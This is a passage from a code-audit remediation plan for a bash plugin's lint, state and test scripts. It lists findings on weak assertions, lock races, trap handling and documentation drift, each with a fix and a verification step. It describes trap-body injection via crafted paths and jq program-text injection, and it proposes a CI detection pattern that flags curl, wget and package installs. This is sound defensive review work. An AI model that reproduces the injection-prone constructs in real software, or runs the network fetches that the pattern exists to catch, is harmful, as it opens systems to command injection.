t42_ac4_forms="$(grep -rho 'CLAUDE\.md Sec\.\\"*"*Mermaid diagram conventions\\"*"*' "${PLUGIN_DIR}/" 2>/dev/null | sort -u | wc -l | tr -d ' ')"
[[ "$t42_ac4_forms" == "1" ]] && pass "T42 AC4 -- exactly one quoting form of the by-name reference is in use"
```

The pattern is single-quoted, so grep receives `\\` literally; this is BRE (no `-E`), so `\\` is an
escaped backslash matching **one literal backslash**, and the regex *requires* a backslash
immediately after `Sec.` and after `conventions`. The live tree contains twenty unescaped
occurrences (across `agents/edm-architect.md`, `edm-srd-writer.md`, `edm-ticket-writer.md`,
`edm-srd-auditor.md`, `edm-ticket-auditor.md`, four SKILL.md files, two pattern docs and one
fixture) and exactly one escaped occurrence at `plugins/edm/skills/srd/SKILL.md:182`. Only the
deviant line matches, `sort -u | wc -l` is `1`, and the suite reports PASS. **The assertion whose
entire purpose is "identical quoting style across every by-name reference" is blind to 20 of the 21
references and currently reports green over a real violation.**

Sub-items B1 and B2 are confirmed fixed (`wave6:3459-3467`, `:3473-3477`); B4 (the total-score
self-consistency identity) is folded into CA-039.

**Fix**:

```bash
t42_ac4_forms="$(grep -rhoE 'CLAUDE\.md Sec\.\\?"?Mermaid diagram conventions\\?"?' "${PLUGIN_DIR}/" 2>/dev/null | sort -u | wc -l | tr -d ' ')"
t42_ac4_raw="$(grep -rhcE 'CLAUDE\.md Sec\.\\?"?Mermaid diagram conventions' "${PLUGIN_DIR}/" 2>/dev/null | paste -sd+ - | bc)"
```

Assert the distinct-form count is `1` **and** the raw match count is `>= 11`, so "matched nothing"
and "matched only one file" are distinguishable from "one consistent form". Then normalise
`skills/srd/SKILL.md:182` to the unescaped form.

**Verification**: after normalising `:182`, the distinct count is `1` with a raw count of 21;
temporarily re-escape one reference and confirm the assertion goes red.

**Files affected**: `plugins/edm/bin/tests/wave7-smoke.sh`, `plugins/edm/skills/srd/SKILL.md`.

---

## CA-039 (P1, lens L4): the scorer's five dimensions still carry no expected-value assertion

**Sites**: `plugins/edm/evals/score-artifacts.sh:203-238` (dim 2), `:240-361` (dim 3), `:363+`
(dim 4); assertions at `plugins/edm/bin/tests/wave7-smoke.sh:436-486`.

**Problem**: genuinely improved -- the fixture gained a mermaid block and an `audit-srd.md`, and
dimensions 3 and 4 are no longer dead code. What did not land:

1. **No expected value anywhere.** Every dimension assertion is `!= null` (`:471-474`) or the
   self-consistency identity at `:476-480`, which recomputes `(sum / dimensions_scored * 10 |
   round) / 10` from the scorer's own output. It cannot detect a wrong dimension score, a wrong
   sign, a swapped dimension, or a scorer returning 0 for everything.
2. **The vague-AC detector's polarity is untested.** The fixture's single AC is deliberately not
   vague, so `vague_count` is `0` on every run. An empty `vague-ac-patterns.txt`, a malformed regex
   or a failing `grep -icE -f` still yields `D2_SCORE = 100`.
3. **Dimension 3 only ever sees a valid diagram.** The committed
   `bin/tests/fixtures/mermaid/invalid/` corpus is never fed to the scorer, and nothing cross-checks
   `score-artifacts.sh`'s awk against `_edm-lint-lib.sh`'s over a common corpus -- two independent
   implementations of one rule with no comparison (see CA-019).
4. **Dimension 4 only exercises the forward direction.** Nothing in the fixture names a fabricated
   requirement ID, so the reverse half -- the only thing distinguishing dimension 4 from dimension
   1's forward-only check -- never runs.

**Fix**: add a second, deliberately vague AC and assert `.dimensions[1].score == 50`; assemble a
second `srd.md` from `bin/tests/fixtures/mermaid/valid/*` asserting dimension 3 == 100, and one from
`invalid/*` asserting < 100; add a fabricated `TSVE-99` to `audit-srd.md` and assert dimension 4
against the hand-computed value. Replace `wave7:476-480` with literal expected scores.

**Verification**: invert the sign of one dimension in the scorer and confirm the suite goes red.

**Files affected**: `plugins/edm/bin/tests/wave7-smoke.sh`,
`plugins/edm/bin/tests/fixtures/code-audit/` (fixture additions).

---

## CA-040 (P1, lens L4): `convergence_exempt` is still completely untested at both consumers

**Site**: `plugins/edm/bin/edm-state:687-704` (definition), consumers at `:2131` and `:3196`.

**Problem**: unchanged. `grep -rn 'convergence_exempt' plugins/edm/` returns six hits in
`bin/edm-state` and one in `CHANGELOG.md:64`. **Zero hits in `bin/tests/`.** No test covers the
`lifecycle_mode` half at either consumer, the `mode == "null"` legacy branch, or -- most
importantly -- the **deliberate asymmetry that `approve-gate code-audit` stays refused under
`fast-track`** while archive and `audit-converged` become exempt. A future edit routing
`approve-gate` through the helper "for consistency" opens a gate bypass and nothing fails.

**Fix**: three cases per consumer across the four `mode`/`lifecycle_mode` combinations, plus one
asserting `approve-gate code-audit` still refuses under `fast-track`.

**Verification**: route `cmd_approve_gate` through `convergence_exempt` and confirm the new
asymmetry case goes red.

**Files affected**: `plugins/edm/bin/tests/wave6-smoke.sh`.

---

# P2

77 open. `BLOCKING_FILTER` includes P2, so all of them are in the blocking set. Grouped by owning
area; each entry states the residual, the fix and the verification. Entries marked **[multi-lens]**
carry independent corroboration.

## Group A -- the shared-lint-library extraction (the last limb of round 1's root cause 1)

**Fix all six in one commit; they share a boundary.**

**CA-019 [multi-lens L7+L10] `evals/score-artifacts.sh:303`, `:311`, header `:80-82`.**
Round-1 severity P1, re-graded P2 by L10 with rationale ("the produces-wrong-answers-on-committed-
fixtures basis is discharged"); L7 filed the same site as a fresh P1. **Treat as the highest-priority
P2 in this plan.** All seven rule-body divergences closed -- but by *cloning the canonical awk
verbatim*, not by extracting it. Two byte-equivalent 45-line copies now sit in the tree with no
guard holding them together. Fence recognition did not come along: `:303`/`:311` are still anchored
at column 1 while `_edm-lint-lib.sh:27-28` de-indents, so `fixtures/mermaid/valid/v12-indented-fence.md`
-- the fixture that exists for this case -- is invisible to dimension 3, which silently under-counts.
The scorer also has no `edm-lint-ignore` handling at all. The header at `:80-82` still says "That is
a bin/ change and is not attempted here" -- the stated blocker was discharged when
`bin/_edm-lint-lib.sh` landed.
*Fix*: lift `strip_entities` + `is_violation` into `plugins/edm/bin/edm-mermaid-rules.awk` and
consume it from both sides with a two-`-f` awk invocation (this keeps the scorer's per-block verdict
stream and exit-0 contract intact); or, at minimum, source `_edm-lint-lib.sh` and use its `mermaid`
set. Rewrite `:64-82` to describe what is actually shared. *Verify*: one assertion that both sides
load the same rule file, plus a fixture asserting the two agree on `v12-indented-fence.md`.

**CA-155 [multi-lens L7+L10] `bin/_edm-lint-lib.sh:95-99`.** The shared `report_violation` probes
`${violations+x}` then `${VIOLATIONS+x}` -- it encoded the caller naming divergence rather than
resolving it. A fourth consumer that names its counter anything else gets findings **printed and not
counted**, so the script exits 0 on a dirty tree; two of the three consumers are blocking CI jobs.
*Fix*: rename `edm-check-grants:125`'s `VIOLATIONS` to `violations`, delete the `elif`, and make the
no-counter case a hard `return 1` rather than an empty `fi`. *Verify*: a `harness-smoke.sh` case
sourcing the library with no counter declared and asserting a non-zero return.

**CA-156 [multi-lens L7+L10] `bin/edm-check-grants:127-130`, `bin/edm-check-vocabulary:134-137`.**
`ignored_line_set()` survives as a byte-identical four-line hand-copy in exactly the two files the
library was created to de-duplicate, and `edm-lint-artifacts:255` derives the same projection a
third way inline. `build_line_classes`' tab-separated record shape now has three independent parsers
outside the library.
*Fix*: add `ignored_line_set`, `mermaid_line_set` and `marker_line_set` to `_edm-lint-lib.sh`,
delete both copies, route `edm-lint-artifacts`' four inline projections through them.

**CA-153 (L6) `bin/_edm-lint-lib.sh` (whole file).** The file that is now the single source of truth
for three shipped binaries carries a shebang and nothing else. The de-indent rationale at `:28` --
the reason roughly 60 indented fences stopped false-positiving in a blocking job -- was lost in the
extraction and now reads as an incidental `sub()`. `report_violation`'s two signatures differ in
field *order*, not just arity, and are undocumented. The four emitted classes and the
`violations`/`VIOLATIONS` convention are stated nowhere.
*Fix*: a header block stating the file is sourced (never executed), its three consumers, the
tab-separated four-class contract of `build_line_classes`, both `report_violation` forms with an
example of each, and the counter convention. Restore the de-indent rationale as a comment on `:28`,
naming the false-positive class it prevents.

**CA-010 [multi-lens L6+L7+L10] `bin/tests/wave7-smoke.sh:296-299`, with `:1683`, `:2723`.**
Round-1 P1 re-graded P2 (the code half is eliminated). The prose is fixed in both checkers; the one
assertion guarding the shared-library boundary still greps `edm-check-grants` for
`report_violation\|build_ignore_set\|is_ignored_line` and passes on any hit. `build_ignore_set`
exists nowhere in the tree -- so one suite simultaneously asserts the symbol is gone (`:1683`) and
describes a file as mirroring it (`:296`). Worse: the assertion passes on the presence of *call
sites*, so it would pass equally if the `source` line were deleted and the three helpers pasted
back in. Its label also attributes the helpers to `edm-lint-artifacts`, which is now a peer
consumer, not the owner.
*Fix*: replace `:296-299` with a behavioural pair -- assert each checker contains
`source .*_edm-lint-lib.sh` and defines none of `^build_line_classes()`, `^is_ignored_line()`,
`^report_violation()` itself. Retire the `build_ignore_set` grep at `:1683` and the stale comment at
`:2723`. Update the echo text to name `build_line_classes`.

**CA-144 (L3) `bin/_edm-lint-lib.sh:20-25`.** An `edm-lint-ignore` marker on the line *before* a
fence opener consumes the opener via `ignore_next`'s `next`, so `in_fence` stays 0: the fenced body
is scanned as prose (false positives for `unicode`, `attribution` and `leaked-tool-tag` on legitimate
fenced content) and the fence's **closing** line is then matched by the opener branch, inverting
suppression for the rest of the file. The CA-057 `END` reconciliation cannot see it -- the machine
ends balanced, just off by one fence.
*Fix*: run the fence-open/close detection *before* the `ignore_next` consumption, or set
`ignore_next = 0` and fall through rather than `next`ing. *Verify*: a fixture with
`<!-- edm-lint-ignore -->` directly above a fence opener.

## Group B -- `bin/edm-state` correctness and concurrency

**CA-133 [multi-lens L1+L3] `bin/edm-state:3699`, `:3676-3681`.** Command substitution strips
`_render_pattern_entry`'s trailing newline and `_splice_pattern_file` writes it with `printf '%s'`.
Two consequences: multi-entry appends lose the blank line before every `### ` after the first; and
the last entry's final line is **glued to the line at `insert_line`**. Masked today only because
`pattern_insert_line_for` backs up over trailing blanks and the `---` rule for the four shipped
docs. When a section's last content line is directly adjacent to the next `^## `, `awk`'s
`j = ins - 1` returns `ins` itself -- the heading -- producing
`> ...not yet curated prose.## Pre-Flight Checklist` and dropping the document to three `##`
headings, failing the blocking `lint:pattern-library-contract` job **on a document the tool itself
corrupted**, inside the lock, atomically. Unreachable by any test because CA-002's coverage does not
exist.
*Fix*: append `$'\n'` per entry at `:3699` -- `pending_entries="${pending_entries}$(...)"$'\n'`.
That gives every entry a terminator, so entry N+1's leading `\n` becomes a real blank line and the
final entry cannot merge with `tail`'s first line. Leave `printf '%s'` alone once this lands.
*Verify*: CA-002's byte-content assertion.

**CA-135 [multi-lens L1+L8] `bin/edm-state:1945-1948`, `:2002`, `:2012-2018`.** The CA-001 fix's own
comment says a present-but-non-integer `schema_version` "is coerced, to 0, which then fails the
`-le` guard and is reported rather than acted on". Traced: `to_int` yields `0`; `target_version` is
1 or 2; `[[ 1 -le 0 ]]` is **false**, so the `die` never fires; `:2017` computes `0 + 1 = 1` and
`:2018` offers to stamp `schema_version=1`. A file claiming shape 2 is silently normalised down --
contradicting the function header's "Never lowers `schema_version`" -- and `:2002` prints the
*coerced* value, so the operator never sees the string on disk. Every wave-B check then degrades to
warn-and-proceed.
*Fix*: keep the coercion and add the branch the comment promises:
`if [[ -n "$current_version_raw" && "$current_version" != "$current_version_raw" ]]; then die
"migrate-schema: ${prefix} has a non-integer schema_version (${current_version_raw}); repair the
state file by hand -- refusing to guess a version"; fi`, print the raw value at `:2002`, and correct
the comment.

**CA-141 (L3) `bin/edm-state:836-856`.** The CA-025 stale-lock reclamation is right in shape but has
four edge cases: (1) TOCTOU -- the `rm -rf` at `:847` can delete a lock another contender reclaimed
between the `kill -0` decision and the removal, so two processes run the critical section
concurrently by a mechanism that did not exist before the fix; (2) `kill -0` returns non-zero for a
**live** cross-UID holder (EPERM), so a live holder is declared stale and the lock is stolen with a
message saying the PID "no longer running" when it is; (3) PID reuse / PID namespaces make a dead
holder look alive (benign direction); (4) both reclaim paths `continue` without incrementing
`tries`, so the 50-try bound is not the bound the code reads as having.
*Fix*: make the reclaim conditional and atomic -- `mv "$lockdir" "${lockdir}.stale.$$" 2>/dev/null`
and proceed only if the rename succeeded; treat EPERM from `kill -0` as "alive, not mine"; increment
`tries` on both reclaim paths.

**CA-142 (L3, medium) `bin/edm-state:487-490`, `:509-511` nested inside `:858-869`.** `write_atomic`
installs a second trap layer inside `with_state_lock`'s mkdir branch -- nesting depth two, which
this repository's own harness records as unsupported (`bin/tests/_harness.sh:49-50`: "bash 3.2 has
no reliable `trap -p` composition; keep the nesting depth at one"). Certain consequence: for the
whole duration of the write the EXIT/INT/TERM disposition is `_write_atomic_cleanup`, **not** the
lockdir cleanup, so a signal during the render leaves `$lockdir` on disk -- survivable only because
CA-025's staleness detection landed, and nothing records that the two fixes are load-bearing for
each other. Conditional consequence: if the `trap -p` capture returns empty on bash 3.2,
`_restore_trap`'s `else` branch runs `trap - EXIT`, reintroducing the unconditional disarm CA-025
was filed to remove, one frame lower.
*Fix*: have `write_atomic` skip trap installation when a lock trap is already active (an
`_EDM_TRAP_DEPTH` guard), or push temp paths onto one script-level cleanup list managed by a single
trap. Add the bash-3.2 assertion the harness comment implies.

**CA-143 (L3) `bin/edm-state:862`, `:490`.** Neither INT/TERM handler terminates -- they run their
command and resume. A SIGINT inside the critical section **releases the lock and keeps running the
read-modify-write**, another process can acquire it, and the trailing `rm -rf "$lockdir"` at `:865`
then removes *that* process's lock. Ctrl-C during `/edm:code-audit` or `/edm:implement` is ordinary.
*Fix*: `trap 'rm -rf "$lockdir"; exit 130' INT` and `exit 143` for TERM, keeping the EXIT arm
separate (it must not `exit`); same shape in `write_atomic`.

**CA-159 (L8) `bin/edm-state:490`, `:862`.** Both trap bodies interpolate a filesystem path inside
single quotes at install time: `trap "rm -rf '${lockdir}'" EXIT INT TERM HUP`. A path containing an
apostrophe -- `/Users/o'brien/...`, an ordinary surname -- terminates the quote and makes the stored
body a **syntax error at signal time**, so `write_atomic` leaks a `.tmp.XXXXXX` into a tracked
directory and `with_state_lock` leaks the lockdir. With a crafted path it is trap-body injection.
`SRD_ROOT` (`:56`) is not charset-validated the way `EDM_PRODUCT` now is.
*Fix*: never interpolate into a trap body -- `_STATE_LOCKDIR="$lockdir"; trap 'rm -rf
"$_STATE_LOCKDIR"' EXIT INT TERM HUP` and the same for `_WRITE_ATOMIC_TMP`. This is the form already
used correctly at `edm-lint-artifacts:113`, `edm-check-grants:123` and `_harness.sh:66`. Note the
`_restore_trap` `eval` at `:466-473` is correct as written and must not be changed. *Verify*: a
scratch-repo assertion with an apostrophe in the directory name.

**CA-160 (L8) `bin/edm-state:2346`, `:294`/`:297`.** `HUMAN_HOURLY_RATE_USD` is spliced into jq
*program text* (`'"$HUMAN_HOURLY_RATE_USD"'`) rather than passed as data; every sibling use passes
it via `awk -v`. A value containing `"` or `\(` breaks the program or rewrites the interpolation
(jq has no exec primitive, hence P2). Same class: `EDM_TOKEN_READ_LINE_CAP` goes straight to
`tail -n` with no validation -- a non-numeric value aborts `phase-complete` with a raw
`tail: illegal offset`, and a `+N` value silently inverts "last N lines" into "from line N".
*Fix*: `--arg rate "$HUMAN_HOURLY_RATE_USD"` plus `\($rate)` in the filter; validate both env inputs
once at the top of the file next to their defaults.

**CA-134 (L1) `bin/edm-state:491-492`, `:500-501`.** `write_atomic` captures `ec=$?` directly after
`"$@" > "$tmp"` and after `mv` under `set -e`. Correct **only because** all five call sites sit in
errexit-suspended positions; L2 independently reached the same site and confirms no live defect but
records the same hazard. The next bare `write_atomic` call changes behaviour from "return the
renderer's status" to "abort the process with the caller's traps never restored", and the one bare
call at `:1337` runs inside the `flock` subshell where errexit-suspension propagation is
implementation-dependent across bash 3.2 and bash 5.x.
*Fix*: `ec=0; "$@" > "$tmp" || ec=$?` and `mv -f "$tmp" "$dest" || ec=$?`. *Verify*: a smoke case
calling `write_atomic` bare with a renderer that `return 1`s, asserting the process survives, the
destination is unchanged, and no `*.tmp.*` remains.

**CA-136 (L1, medium) `bin/edm-state:1847-1872`.** `cmd_get_coverage`'s first two jq renderers lack
the `|| true` fallback their two siblings at `:1879` and `:1888` carry. Under `set -euo pipefail` a
state file that `[[ -f ]]` accepts but jq cannot parse aborts the command **with no message at all**
-- jq's diagnostic is already discarded by `2>/dev/null`.
*Fix*: append `|| true` at `:1858` and `:1872`, and add
`jq -e . "$state" >/dev/null 2>&1 || die "get-coverage: unparseable state file at $state"` after
`:1843`.

**CA-137 (L2) `bin/edm-state:988-1158`.** `state_anomalies` declares `local found=0` and assigns
`found=1` at twelve anomaly sites, then returns 0 unconditionally. Never read, and no caller can
read it (it is `local`). Vestigial from the pre-T05 exit-code contract; every anomaly class added
since has copied the dead store forward.
*Fix*: delete the declaration and all twelve assignments. **Do not wire it up** -- a return code
would be a second, competing source of truth against `cmd_validate`'s class parse, which T05 AC2
made canonical. Distinguish from the two live twins at `:1397` and `:2631`, which are consumed.

**CA-140 (L2) `bin/edm-state:922-923`.** `sv="$(to_int "$sv" 0)"` always prints a non-empty value, so
the `-z "$sv"` disjunct on the next line can never be true. Residue of the CA-001 fix, which
inserted the coercion above the pre-existing guard.
*Fix*: `if [[ "$sv" -eq 0 ]]; then`. Keep the comment block at `:912-921` verbatim -- it is the only
place the injection rationale is stated for this field.

**CA-025 (L3) `bin/edm-state:830` vs `:863`.** Round-1 P1 re-graded P2: both P1 halves landed
(staleness detection on every failed `mkdir`, trap save/restore via `_restore_trap`). Residual: the
`flock` branch runs the locked body in a **subshell** while the `mkdir` branch runs it in the
current shell, with one docstring describing both and the divergence documented nowhere. No live
defect (every current body communicates by stdout or exit status) -- a trap for the next locked
helper, which will work on macOS and silently return nothing on Linux.
*Fix*: run the mkdir branch's `"$@"` in a subshell too, or state in the docstring that a locked body
must not set caller variables, and assert it.

**CA-026 (L3) `bin/edm-state:1752`, `:1797`.** Round-1 P1 re-graded P2: the three per-file guards
landed and the `SRD/unknown/` case is closed. Residual: the per-initiative body is still unwrapped,
so a `jq` failure in `rmw_state` or a `die` from `write_handoff_internal` ends the checkpoint sweep
for **every later initiative**, behind hook call sites that end in `|| true`. Second residual: a
state file whose `.prefix` disagrees with its directory still creates a stray `SRD/<other>/`.
*Fix*: `( ... ) || echo "checkpoint: [warn] skipping ${prefix}: exit $?" >&2` around the
per-initiative body; assert `state_file_for "$prefix"` resolves to the `$state` being iterated
before mutating.

**CA-056 (L3) `bin/edm-state:3647`, `:3778`.** Both the `grep -qxF` pre-flight and awk's `$0 == h`
are fence-unaware and first-match-wins, so a pattern doc documenting its own Append Schema inside a
fenced example gets the entry spliced into the fence, unbalancing it and tripping the blocking
four-heading contract job on a document `update-patterns` itself corrupted.
*Fix*: now cheap -- the fence state machine is a sourceable function (`build_line_classes`). Require
the match to be outside any fence and refuse when the heading occurs more than once outside fences.

**CA-059 (L3) `bin/edm-state:3336-3339`.** Three of four sub-parts fixed (round number printed
inside the lock, double-completion checked inside the lock, `cmd_init` takes the lock). Residual:
`cmd_record_partial_verdict`'s `close` path is still pre-check-then-lock -- it reads with an
unlocked `read_state` at `:3336`, evaluates `has("closing_verdict")` at `:3339`, and only then
enters `rmw_state`. Two concurrent closes both take the first-closure branch and the second
overwrites the first, violating the documented close-once invariant with no message. The comment at
`:3096-3098` still cites a line number that no longer points at the model it names.
*Fix*: move the `has("closing_verdict")` decision into the jq filter so check and write share one
lock, as `_cmd_audit_round_complete_body` now does.

**CA-061 (L3) `bin/edm-state:2707`.** The dedup landed (`record_degraded_check:1173` is idempotent on
`(check, reason)`), so `degraded_checks` no longer grows without bound. Residual: `gate-check` still
routes through `rmw_state` on **every** hook invocation for a legacy initiative -- the idempotence
is inside the jq filter, not in front of it -- so each of the five `UserPromptExpansion` hooks takes
the write lock, writes a `.bak` and `mv`s a byte-identical file. On a read-only checkout the `cp -p`
at `:527` aborts under `set -e` and blocks prompt expansion. The `--help` block at `:31` still says
`(read-only)`.
*Fix*: short-circuit before `rmw_state` when the pair is already recorded, or drop the call from
`gate-check` and amend the read-only contract.

**CA-069 (L6) `bin/edm-state:2132`.** Two of three messages fixed (`:1423` approve-gate usage now
lists all three legal forms; `:2214` archive re-query refusal now covers ledger repair). The
convergence waiver still names `mode` as the cause: `convergence_exempt` returns true for two
independent reasons, and on the `lifecycle_mode` path `mode` is untouched -- so a
standard-mode/fast-track initiative prints `[warn] standard mode -- skipping code-audit convergence
check`, and standard mode is precisely the mode that requires one. `:2136`, one line below, gets it
right.
*Fix*: `echo "[warn] no code-audit round in this phase graph (mode=${mode},
lifecycle_mode=${lifecycle_mode}) -- skipping the convergence check" >&2`.

**CA-154 (L6) `bin/edm-state:8`, `bin/edm-lint-artifacts:5`.** "Mirrored verbatim in
edm-lint-artifacts (same fix, same reason)" names **one** of eleven files that now carry the
sentinel extractor after the CA-005 sweep, and the family is not verbatim -- form A keeps the
leading `# ` on every help line (eight sites), form B strips it (three sites), so `edm-state --help`
and `edm-compare-eval --help` render differently. A maintainer trusting this line edits two files
and misses nine.
*Fix*: replace both cross-references with "the same sentinel convention is used by every `bin/`
helper and the three `evals/` drivers" and settle on one awk form. Folds into CA-005.

## Group C -- test quality

**CA-016 [multi-lens L4+L7] `bin/tests/run-all.sh:22-30`.** Round-1 P1 re-graded P2: three of four
items landed (CRASH branch, exit-0-without-summary branch, per-suite one-assertion floor, single
parser after `wave4b:175` adopted the standard summary). Residual: **no minimum suite count.**
`:27-30` fails only on *zero* discovered suites, and `_PREFERRED_ORDER` gates nothing. Delete or
rename `wave7-smoke.sh` -- roughly 830 assertions -- and the aggregate reports `ALL SUITES PASSED`
and exits 0. Every AC of the form "Verify: `bash plugins/edm/bin/tests/run-all.sh`" rests on this.
*Fix*: assert every name in `_PREFERRED_ORDER` was discovered, failing and naming any that were not;
assert `${#_run_order[@]} -ge 7`.

**CA-146 (L4) `bin/tests/run-all.sh:60-114`.** The accounting layer every `run-all.sh` AC rests on
was substantially rewritten by CA-016's remediation and is covered by **no test**. `run-all.sh` is
not a `*-smoke.sh` so it never self-discovers; `harness-smoke.sh` has no case for it; `wave7:339`
only greps its text.
*Fix*: a `harness-smoke.sh` case copying `run-all.sh` into a scratch directory alongside three stub
suites -- one green, one printing `Results: 0 passed, 1 failed` and exiting 1, one exiting 1 with no
summary -- asserting the aggregate prints `CRASH`, names each failing suite, and reports a non-zero
total.

**CA-145 (L4) `bin/tests/_harness.sh:132-136`, `:140-149`.** `count_matches` and
`assert_absent_with_control` are the remediation vehicles for CA-036 and CA-037, now relied on at 21
sites, and neither has a positive or negative case in `harness-smoke.sh`. Worse, `count_matches`
re-introduces the class it was written to remove: `count="$(command grep -c "$@" 2>/dev/null)" ||
count=0` collapses grep exit 2 (file not found) and exit 1 (no match) into the same value, and `0`
is the **passing** value for every expect-zero caller.
*Fix*: add positive/negative cases for both helpers (including one proving
`assert_absent_with_control` fails when the control haystack lacks the needle -- its whole point);
split `count_matches` into a strict variant that fails on grep exit 2, or document the caveat and
require expect-zero callers to pair it with a control.

**CA-037 (L4) `bin/tests/wave6-smoke.sh:2430` and ~19 further sites.** Round-1 P1 re-graded P2:
three sites gained controls and the single most load-bearing one (`wave7:177-184`, the `--force`
absence check) is done exactly as prescribed and is the model. Roughly twenty remain uncontrolled,
including the **duplicate** `--force` check in wave6, `wave6:2427-2429`'s
`EDM_SKIP|EDM_FORCE|SKIP_CHECKS` scan, `wave7:862-866` (T21 AC5), the three T66 AC4 deleted-text
counts at `:964-975`, both `code_audit_converged` absence checks (`:355-357`, `:1026-1029`),
`wave7:336-338`'s mapfile regex that still requires trailing whitespace so `mapfile<f` can never
match, `:1386-1389` and `:2164`.
*Fix*: route the remaining sites through `assert_absent_with_control`; where no natural control
exists, add the one-line comment naming the adjacent control, as `wave7:951-955` now does.

**CA-085 [multi-lens L4+L8] `bin/tests/wave7-smoke.sh:3383-3395`.** Two defects at one assertion.
(a) L4: an absent job yields an **empty body** that matches no network pattern and is scored clean
-- delete `test:smoke` or `lint:shellcheck` from the pipeline and "no blocking job calls
curl/wget/anthropic.com" still passes while the far more consequential fact goes unreported. (b) L8:
the extractor reset is fixed and now matches colon-bearing job names, but `:3391` still greps only
`'curl |wget |anthropic\.com'`, so the unpinned package installs in every blocking job's
`before_script` stay invisible, and no positive control was added.
*Fix*: fail explicitly when `t67_job_body` is empty, naming the job; broaden the pattern to
`'curl |wget |anthropic\.com|apk add|apt-get|npm install'`; add a positive control (inject a `curl`
into a scratch copy of the YAML and assert the assertion fails).

**CA-100 (L4) `bin/tests/wave7-smoke.sh:1014-1021`, `:3402-3403`.** Same empty-block blind spot as
CA-085(a): a job absent from `.gitlab-ci.yml` yields an empty `t66_job_block`, contains no
`allow_failure`, and is scored compliant. Existence, `stage: lint`, and checker-union are all
unasserted. `:3402-3403` still `echo`s "AC10 is a recorded, unfixed gap ... four lint checks run as
sequential script lines in one job" while `:1015` and `:3383` enumerate the four split jobs as live
and CLAUDE.md documents the split as landed -- stale prose that reads as an honest gap record and is
now false, and cannot fail because it is an `echo`.
*Fix*: assert each block is non-empty before testing it; assert `stage: lint`; assert the union of
the four scripts names `bash -n`, `edm-lint-artifacts`, `edm-check-grants` and
`edm-check-vocabulary`; delete `:3402-3403`.

**CA-038 (L4) `bin/tests/fixtures/mermaid/invalid/`.** Round-1 P1 re-graded P2: the valid direction
landed (`v12-indented-fence.md`). The second prescribed fixture did not -- `invalid/` still holds
only `i01`-`i05`, every one with a column-0 fence, while `CHANGELOG.md:46` records the bug as
two-sided ("**and missed violations inside an indented mermaid fence**"). Revert the de-indentation
in the mermaid-scan path and the suite stays fully green. The em-dash half of `v12` is also missing,
so class 2 suppression inside an indented fence is untested.
*Fix*: add `invalid/i06-indented-mermaid-label.md` -- an indented ```` ```mermaid ```` fence with a
raw `;` inside a `[...]` label plus the `expected-line:` marker the corpus uses -- and add an em
dash to `v12`.

**CA-042 (L4) `bin/tests/_harness.sh:177`.** Round-1 P1 re-graded P2: the missing-baseline vacuous
pass is fixed and correctly tested (`harness-smoke.sh:125-130`). Residual: `"$@" >/dev/null 2>&1 ||
true` still discards the command's exit code and output across 49 call sites, so the helper passes
identically whether the command refused as intended, was not found, or died on a syntax error. The
prescribed `check_refuses_and_leaves_state` -- what 45 of the 49 sites actually want -- was not
added, and the four read-only sites still have no output assertion.
*Fix*: add `check_refuses_and_leaves_state <label> <expected-msg> <state-file> <cmd...>` combining
`check_fails` with the hash comparison; convert the 45 must-refuse sites; precede the four read-only
sites with an output assertion.

**CA-099 (L4) `bin/tests/wave4b-smoke.sh:57-65`.** Unchanged. Nine assertions labelled "X in layout"
match a bare filename anywhere in a 1000-line file that also contains a CI table, a state-field
table, a pricing table and a mode matrix. Moving `architecture.md` out of the layout tree and
mentioning it once in prose keeps all nine green. `_wave7_extract_section` exists for exactly this
and is not used here.
*Fix*: extract the fenced layout block once and assert each token against that string.

**CA-102 (L4) `bin/tests/wave7-smoke.sh:372`.** The E4 alternation count is fixed (four scoped
assertions at `:978-981`). Residual: `sed -n '69,106p' "$CODE_AUDIT_SKILL"` still pins three
assertions to absolute line numbers in a file other tickets edit freely, while
`_wave7_extract_section` -- written to replace exactly this -- is called at **one** site in the whole
suite. Drift-prone literals also remain at `:987-989` (`-eq 30`), `:990-992` (`-eq 14`) and
`:327-328` (`-eq 30`), none naming a source of truth in its failure message; `:324-326` is the
counter-example that does it right.
*Fix*: replace the `sed -n` range with `_wave7_extract_section`; name the source of truth in the
three literal-count failure messages.

**CA-147 (L4) `bin/tests/wave7-smoke.sh:3342-3348`.** The label claims seven measurement modes; the
assertion establishes that the usage text contains one token (`generate-fixture`). A `timing.sh`
reduced to `echo generate-fixture; exit 0` passes both assertions -- and this is the script that
produces the committed latency budgets in `CHANGELOG.md`'s T67 table and the two budgets in
`plugins/edm/CLAUDE.md`.
*Fix*: assert all seven mode names appear in the usage text; add one fast smoke case invoking a
single cheap mode against a tiny generated fixture and asserting a parseable millisecond figure.

**CA-094 (L10) `bin/tests/wave7-smoke.sh:1035` and 6 more; 13 `edm-check-grants` runs.** Seven
independent whole-tree `--all` lint scans (`:1035`, `:1864`, `:2009`, `:2288`, `:2398`, `:2505`,
`:2596`) and thirteen whole-tree `edm-check-grants` runs still execute in one suite with nothing
mutating the tree between them; five of the seven discard output entirely. The `WAVE7_ALL_LINT_OUT`
capture is still declared **below** seven of its potential consumers, and no grants capture was
added. What did land is the CA-103 invariant fingerprint at `:3075-3078`/`:3413-3418` -- exactly the
guard that makes single-capture safe -- so the mechanism is now in place and unused.
*Fix*: hoist the lint capture above `:1035`; add a `WAVE7_GRANTS_*` capture beside it; keep the one
timed run and the two cases that assert on output.

**CA-096 (L10) `bin/tests/run-all.sh:116-131` vs `:133-148`.** The same 15-line standalone-checker
block, differing only in script name, variable prefix and label. **The predicted cost has already
been paid**: `edm-check-vocabulary` -- the third standalone checker, and one of the two in blocking
CI jobs -- is not invoked by the aggregator at all.
*Fix*: `_standalone_check <script-name> <label>` returning pass/fail into the aggregate counters;
three call sites, the third being `edm-check-vocabulary`.

**CA-101 (L4, CARRIED, NOT RE-VERIFIED) `bin/_edm-lint-lib.sh`.** L4 reported this at low confidence
with an explicit statement that it did not read the T43 scratch fixtures closely enough to decide
whether the two prescribed boundary lines for `strip_entities`' 1..10 character walk were added.
**Kept `open` rather than demoted to NOTED**, because "not checked" is not "not a defect"; it stays
in the blocking set until someone verifies it. *Action*: read
`bin/tests/wave7-smoke.sh:1679-1903`, confirm or add the two boundary fixture lines, and close or
re-file with evidence.

## Group D -- documentation accuracy and cross-file consistency

**CA-005 [multi-lens L1+L2+L6+L7+L10] `bin/edm-sync-canonical-sections:43`.** Round-1 P1 re-graded
P2 (L10: "the P1 basis -- a silently truncated exit contract -- is discharged"; L2 and L6 both
verified the one remaining non-sentinel script currently prints its **complete** header, so no
